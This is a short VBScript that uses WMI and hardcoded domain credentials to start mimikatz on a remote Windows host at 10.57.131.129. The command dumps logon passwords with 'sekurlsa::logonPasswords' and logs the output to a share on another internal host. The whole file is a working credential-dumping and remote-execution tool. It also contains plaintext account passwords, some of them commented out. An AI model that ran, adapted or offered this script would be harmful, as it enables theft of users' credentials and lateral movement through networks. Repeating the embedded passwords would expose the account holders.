dim strCommand, strComputer
strComputer = "10.57.131.129"

'Логин админа
'strUser = "ce\a_v_peregudov"
strUser = "ce\CETL_Andrey"
'Пароль
'strPassword = "tr3falTX5"
strPassword = "l.k.j987TY"

' Create WMI object
'Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
Dim objLocator: Set objLocator = CreateObject("WbemScripting.SWbemLocator")
objLocator.Security_.ImpersonationLevel = 3
Set objWMIService = objLocator.ConnectServer (strComputer, "root\cimv2", strUser, strPassword)  
'objWMIService Service.Security_.Privileges.AddAsString("SeShutdownPrivilege")

strCommand = "C:\hash\mimikatz.exe "  & Chr(34) & "cd \\10.57.131.155\start\Log" & Chr(34) & " " & Chr(34) & "Log" & Chr(34) & " " & Chr(34) & "privilege::debug"& Chr(34)_
& " " & Chr(34) & "sekurlsa::logonPasswords" & Chr(34) & " " & Chr(34) & "exit" & Chr(34)

RemoteExecute("")


Function RemoteExecute(msg)
	Set objNewProcess = objWMIService.Get("Win32_Process")

	' Create process based on strCommand
	intReturn = objNewProcess.Create(strCommand, Null, Null, intProcessID)
	If intReturn <> 0 Then
		WriteLog " Process could not be created." & _
		vbNewLine & " Command line: " & strCommand & _
		vbNewLine & " Return value: " & intReturn
	Else
		WriteLog " Process created." & _
        vbNewLine & " Command line: " & strCommand & _
        vbNewLine & " Process ID: " & intProcessID
		Do While objWMIService.execquery("select * from Win32_process where ProcessId = " & intProcessID).count > 0
			Wscript.sleep 2000
		Loop
		WriteLog " Process finish"
	End If
	
	
End Function 

Function WriteLog(msg)
  WScript.StdOut.WriteLine msg
End Function